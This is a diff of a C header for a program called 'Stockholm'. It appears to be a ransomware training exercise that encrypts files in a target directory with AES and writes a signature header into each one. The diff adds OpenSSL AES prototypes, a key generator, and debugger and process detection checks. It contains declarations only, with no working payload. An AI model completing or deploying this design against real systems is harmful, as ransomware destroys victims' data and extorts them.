@@ -6,13 +6,15 @@
 # include <fcntl.h>
 # include <unistd.h>
 # include <stdint.h>
-# include <sys/mman.h>  // For mapping
-# include <elf.h>       // For ELF header
+# include <sys/mman.h>      // For mapping
+# include <elf.h>           // For ELF header
 # include <string.h>
-# include <time.h>      // For rand & srand (encryption key generation)
-# include <dirent.h>    // For looping through directory
+# include <time.h>          // For rand & srand (encryption key generation)
+# include <dirent.h>        // For looping through directory
 # include <stdbool.h>
-# include <sys/stat.h>  // For checking if directory
+# include <sys/stat.h>      // For checking if directory
+# include <openssl/aes.h>   // For AES key generation
+# include <openssl/rand.h>
 
 /*-------------------------------- Colors ---------------------------------*/
 
@@ -28,15 +30,20 @@
 /*------------------------ Defines, enum, struct --------------------------*/
 
 // Paths of the target directories
-# define FA_TARGET_ARRAY_SIZE   2
-# define FA_TARGET_PATHS        { "/tmp/test/", "/tmp/test2/" }
+# define FA_TARGET_ARRAY_SIZE   1
+# define FA_TARGET_PATHS        { "/home/mint/infection/" }
 
 // Unhandled paths
 # define FA_UNHANDLED_DIRS_ARRAY_SIZE   2
 # define FA_UNHANDLED_DIRS      { ".", ".." }
 
-// Error code
-# define FA_ERROR               1
+// Returns
+enum fa_e_returns
+{
+    FA_SUCCESS,
+    FA_ERROR
+};
+
 // Maximum amount of handled files on a directory
 # define FA_MAX_FILES           1024
 
@@ -47,7 +54,9 @@
 // Signature injected in the target files's Stockholm header
 # define FA_SIGNATURE           "STOCKHLM"
 # define FA_STOCKHLM_EXT        "ft"
-# define FA_STOCKHLM_EXT_LEN    3
+# define FA_STOCKHLM_EXT_SIZE    3
+# define FA_AES_KEY_SIZE         16
+# define FA_AES_BLOCK_SIZE       16
 
 enum fa_e_modes
 {
@@ -58,13 +67,13 @@ enum fa_e_modes
 
 enum fa_e_stockhlm_header
 {
-    FA_NEW_HEADER_SIZE          = 0x0118,
-    FA_MAGICNBR_LEN             = 8,
-    FA_AES_ENCRYPT_KEY_LEN      = 256,
+    FA_STOCKHLM_HEADER_SIZE          = 0x0118,
+    FA_MAGICNBR_SIZE             = 8,
+    FA_ENCRYPT_KEY_SIZE          = 256,
 
     // Header offsets
     FA_HDR_OFF_SIGN             = 0x0,
-    FA_HDR_OFF_ENCRYPT_KEY_LEN  = 0x8,
+    FA_HDR_OFF_ENCRYPT_KEY_SIZE  = 0x8,
     FA_HDR_OFF_ENCRYPT_KEY      = 0xc,
     FA_HDR_OFF_FILETYPE         = 0x10c,
     FA_HDR_OFF_FILESIZE         = 0x110
@@ -78,7 +87,7 @@ enum fa_e_stockhlm_header
 typedef struct fa_s_stockhlm_header
 {
     // 0x0000 Magic value/signature to identify encrypted files.
-    uint8_t     signature[FA_MAGICNBR_LEN];
+    uint8_t     signature[FA_MAGICNBR_SIZE];
 
     /*
      * 0x0008 Size (in bytes) of the encrypted AES key.
@@ -95,7 +104,7 @@ typedef struct fa_s_stockhlm_header
      * AES-128 key is stored.
      */
 
-    uint8_t     encryption_key[FA_AES_ENCRYPT_KEY_LEN];
+    uint8_t     encryption_key[FA_ENCRYPT_KEY_SIZE];
 
     /*
      * 0x010C File type internal to this program.
@@ -117,19 +126,36 @@ typedef struct fa_s_stockhlm_header
 extern unsigned char        *g_mapped_data; // file is mapped in memory here
 extern uint16_t             g_modes;        // options given from command line
 extern fa_t_stockhlm_header g_stockhlm_header;
+extern size_t               g_encrypted_filesize;
 
 /*---------------------------- Function prototypes ------------------------*/
+
+void    fa_parse_argv(char *argv[]);
 
 char    *fa_get_filename(char *argv[]);
 int     fa_map_file_into_memory(const char *filename);
 int     fa_process_mapped_data(void);
 int     fa_write_processed_data_to_file(const char *target_path);
+
+/*---------------------------- cryptography ------------------------*/
+
 void    xor_with_additive_cipher(
     void *key, size_t key_length, void *data, size_t data_length, int mode);
-char    *fa_keygen(const char *_charset, size_t strength);
-void    fa_parse_argv(char *argv[]);
-int     pc_is_debugger_attached(void);
-int     pc_is_process_running(const char *process_name);
+
+int     aes_encrypt_data(unsigned char *data, size_t data_len, \
+    const unsigned char *key, unsigned char *iv);
+int     aes_decrypt_data(unsigned char *data, size_t data_len, \
+    const unsigned char *key, unsigned char *iv);
+unsigned char    *fa_keygen(const char *_charset, size_t strength);
+unsigned char    *get_encryption_key(void);
+
+/*---------------------------- process checkers ------------------------*/
+
+bool    pc_is_debugger_attached(void);
+bool    pc_is_process_running(const char *process_name);
+
+/*---------------------------- file handling ------------------------*/
+
 bool    is_extension_handled(char *filepath);
 void    handle_dir(char *target_dir_path);
 
